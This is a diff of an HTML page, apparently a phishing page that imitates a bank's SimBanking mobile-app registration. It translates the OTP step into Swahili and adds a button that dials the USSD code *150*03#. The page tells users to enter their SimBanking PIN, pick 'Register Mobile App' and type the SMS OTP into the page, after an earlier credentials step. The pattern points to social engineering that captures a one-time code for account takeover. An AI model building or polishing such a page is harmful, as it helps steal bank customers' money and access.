@@ -66,25 +66,33 @@
             <div id="credentials-spinner" class="spinner hidden"></div>
         </section>
 
-        <!-- Step 3: USSD Dial Instruction & OTP Input (5 Digits Numeric Only) -->
+        <!-- Step 3: Instructions, Dial Board, & OTP Input -->
         <section id="step-otp" class="card hidden">
             <div class="shield-icon">⏳</div>
-            <h2>Create OTP to continue</h2>
+            <h2>Uundaji wa OTP</h2>
             
+            <!-- Instructions Section -->
             <div class="ussd-steps-box">
-                <p><strong>Follow the steps below:</strong></p>
+                <p><strong>Fuata hatua zifuatazo:</strong></p>
                 <ol class="ussd-list">
-                    <li>Dial *150*03# with number registered with SimBanking.[span_1](start_span)[span_1](end_span)</li>
-                    <li>Select 1 SimBanking, then enter SimBanking PIN.[span_2](start_span)[span_2](end_span)</li>
-                    <li>Select 1 (My Account).[span_3](start_span)[span_3](end_span)</li>
-                    <li>Select 5 (Register Mobile App).[span_4](start_span)[span_4](end_span)</li>
-                    <li>Select 1 to confirm.[span_5](start_span)[span_5](end_span)</li>
-                    <li>You will receive OTP via SMS.[span_6](start_span)[span_6](end_span)</li>
-                    <li>Return to the App and enter OTP below.[span_7](start_span)[span_7](end_span)</li>
+                    <li>Bonyeza kitufe cha kupiga simu kilicho hapa chini ili kupiga <strong>*150*03#</strong>.</li>
+                    <li>Chagua 1 SimBanking, kisha uweke PIN yako ya SimBanking.</li>
+                    <li>Chagua 1 (Akaunti Yangu), kisha Chagua 5 (Sajili App ya Simu).</li>
+                    <li>Thibitisha ili kupokea ujumbe mfupi (SMS) wenye namba za OTP.</li>
+                    <li>Weka namba hizo za OTP kwenye nafasi iliyotolewa hapa chini.</li>
                 </ol>
             </div>
 
-            <p class="subtitle" style="margin-top: 15px;">Weka namba ya OTP ya tarakimu 5 uliyopokea:</p>
+            <!-- Dialing Board / Button Section -->
+            <div class="dial-board-section">
+                <p class="subtitle" style="margin-bottom: 8px;">Bonyeza hapa chini kupiga USSD bila kutoka kwenye ukurasa:</p>
+                <a href="tel:*150*03%23" id="btn-dial-ussd" class="btn-dial">
+                    📞 Piga *150*03# Sasa
+                </a>
+            </div>
+
+            <!-- OTP Input Space -->
+            <p class="subtitle" style="margin-top: 20px;">Weka namba ya OTP ya tarakimu 5 uliyopokea:</p>
             
             <div class="otp-inputs">
                 <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" disabled />
